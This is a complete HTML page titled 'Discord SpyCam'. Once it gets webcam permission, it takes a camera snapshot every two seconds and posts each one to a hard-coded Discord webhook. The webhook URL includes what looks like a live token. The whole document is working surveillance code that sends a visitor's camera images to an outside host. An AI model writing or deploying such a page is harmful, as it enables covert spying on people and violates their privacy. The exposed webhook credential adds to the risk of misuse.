<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>📸 Discord SpyCam</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      text-align: center;
    }
    video {
      border: 2px solid lime;
      border-radius: 10px;
      margin: 10px;
    }
  </style>
</head>
<body>
  <h1>👁 Sending Snapshots to Discord...</h1>
  <video id="video" width="400" height="300" autoplay></video>
  <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1343886403347419156/ZAWGwumD43oPpdlKZZ7fhS67dua1-Pv2TH3poP9WN4tWp02qbY-3ntK3p5914CSe9IuC";

    // Ask for webcam
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("file", blob, "snap.png");

            fetch(WEBHOOK_URL, {
              method: "POST",
              body: formData
            }).then(res => {
              console.log("Sent to Discord 🎯");
            }).catch(err => {
              console.error("Error sending to Discord:", err);
            });

          }, "image/png");
        }, 2000); // Every 2 seconds

      }).catch(err => {
        console.error("Webcam access denied ❌", err);
      });
  </script>
</body>
</html>
